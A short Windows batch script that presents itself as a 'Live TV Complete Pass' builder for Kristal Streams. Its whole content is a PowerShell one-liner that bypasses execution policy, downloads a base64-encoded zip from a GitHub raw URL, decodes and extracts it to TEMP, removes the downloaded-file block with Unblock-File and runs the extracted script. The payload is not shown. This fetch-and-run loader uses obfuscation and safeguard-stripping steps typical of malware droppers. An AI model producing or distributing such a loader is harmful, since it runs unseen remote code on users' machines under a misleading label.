@echo off
setlocal EnableExtensions
title Kristal Streams Live TV Complete Pass 1682046

echo.
echo ==========================================================
echo   KRISTAL STREAMS LIVE TV COMPLETE PASS 1682046
echo ==========================================================
echo.
echo Downloading the verified full-code Windows builder...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; $root=Join-Path $env:TEMP 'ks-1682046-live-tv'; $b64=$root+'.b64'; $zip=$root+'.zip'; $dir=$root+'-files'; Remove-Item $b64,$zip -Force -ErrorAction SilentlyContinue; Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/djudge47/kristalstreams/fe5913d0299a816a87a226dac1bcac96f027ca06/kristalstreams-1682046.zip.b64' -OutFile $b64; [IO.File]::WriteAllBytes($zip,[Convert]::FromBase64String([IO.File]::ReadAllText($b64))); Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $builder=Join-Path $dir 'KS-LIVE-TV-COMPLETE-PASS-1682046.cmd'; if(-not (Test-Path -LiteralPath $builder)){throw 'Full-code Live TV builder was not found after extraction'}; Unblock-File $builder; & $builder; if($LASTEXITCODE){exit $LASTEXITCODE}"

if errorlevel 1 (
    color 4F
    echo.
    echo ERROR: The full-code 1682046 builder could not be downloaded or started.
    echo.
    pause
    exit /b 1
)

exit /b 0
